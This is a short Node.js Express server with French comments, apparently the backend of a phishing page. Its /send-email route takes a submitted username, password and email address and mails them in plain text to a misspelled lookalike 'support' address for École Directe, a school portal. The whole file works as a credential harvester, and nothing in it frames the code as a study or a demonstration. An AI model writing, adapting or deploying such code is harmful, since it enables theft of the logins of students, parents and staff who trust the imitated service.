const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Configurez le transporteur pour nodemailer (remplacez avec vos propres informations Outlook.com)
const transporter = nodemailer.createTransport({
    host: 'smtp-mail.outlook.com',
    port: 587,
    secure: false,
    auth: {
        user: 'votre@outlook.com',
        pass: 'votreMotDePasse'
    }
});

// Route pour gérer la réception des données de connexion et l'envoi de l'e-mail
app.post('/send-email', (req, res) => {
    const { username, password, email } = req.body;

    const mailOptions = {
        from: 'votre@outlook.com',
        to: 'Suport.tecnique_Ecole_Directe@outlook.com',
        subject: 'Informations de Connexion',
        text: `Nom d'utilisateur: ${username}\nMot de passe: ${password}\nAdresse e-mail: ${email}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            res.status(500).json({ success: false, message: 'Erreur lors de l\'envoi de l\'e-mail.' });
        } else {
            console.log('E-mail envoyé : ' + info.response);
            res.status(200).json({ success: true, message: 'E-mail envoyé avec succès.' });
        }
    });
});

app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur le port ${PORT}`);
});
